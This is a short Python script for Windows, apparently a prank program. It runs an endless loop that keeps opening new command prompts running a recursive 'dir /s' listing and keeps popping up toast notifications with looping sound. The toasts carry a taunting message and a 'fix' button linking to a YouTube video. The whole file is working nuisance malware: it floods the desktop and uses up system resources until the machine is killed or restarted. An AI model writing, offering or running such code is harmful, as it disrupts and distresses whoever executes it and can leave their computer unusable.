import subprocess
import threading
from winotify import Notification, audio


def open_cmd_and_run_dir_s():
    try:
        # Start a new command prompt, run `dir /s`, and close automatically after completion
        subprocess.run('start cmd /c "dir /s"', shell=True)


    except Exception as e:
        print(f"An error occurred: {e}")

def show_notification():
    bruh = Notification(
        app_id="YOU FUCKED UP",
        title="What have you done?",
        msg="Why did you open this?",
        duration="short"
    )
    bruh.set_audio(audio.Default, loop=True)
    bruh.add_actions(label="Click this to fix!", launch="https://www.youtube.com/watch?v=L8XbI9aJOXk")
    bruh.show()

def lol():
   while True:
      open_cmd_and_run_dir_s()
      show_notification()

threads = []

for i in range(1):
    t = threading.Thread(target=lol)
    t.daemon = True
    threads.append(t)

for i in range(1):
    threads[i].start()

for i in range(1):
    threads[i].join()